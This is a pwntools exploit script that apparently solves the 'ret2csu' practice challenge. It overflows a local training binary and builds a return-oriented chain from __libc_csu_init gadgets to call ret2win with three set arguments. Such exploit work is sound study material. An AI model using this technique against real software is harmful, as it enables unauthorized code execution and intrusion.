from pwn import *

csu_pops        = p64(0x000000000040069a)
csu_rdx_rsi_edi = p64(0x0000000000400676)
ret2win_arg1    = p64(0xdeadbeefdeadbeef) # rdi
ret2win_arg2    = p64(0xcafebabecafebabe) # rsi
ret2win_arg3    = p64(0xd00df00dd00df00d) # rdx
ret2win         = p64(0x0000000000400510) # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) 
pop_rdi         = p64(0x00000000004006a3)

sh = process(b"./ret2csu")
#gdb.attach(sh)
payload = b"A" * 40

payload += csu_pops
payload += p64(0)                   # rbx
payload += p64(1)                   # rbp -> so the program won't get stuck loop
payload += p64(0x600df8)            # r12 -> address to some function so the program won't crash
payload += p64(0)                   # r13 -> edi
payload += ret2win_arg2             # r14 -> rsi
payload += ret2win_arg3             # r15 -> rdx
payload += csu_rdx_rsi_edi
payload += b"JUNKJUNK" * 7          # padding
payload += pop_rdi
payload += ret2win_arg1
payload += ret2win

sh.recv()
sh.sendline(payload)

sh.interactive()
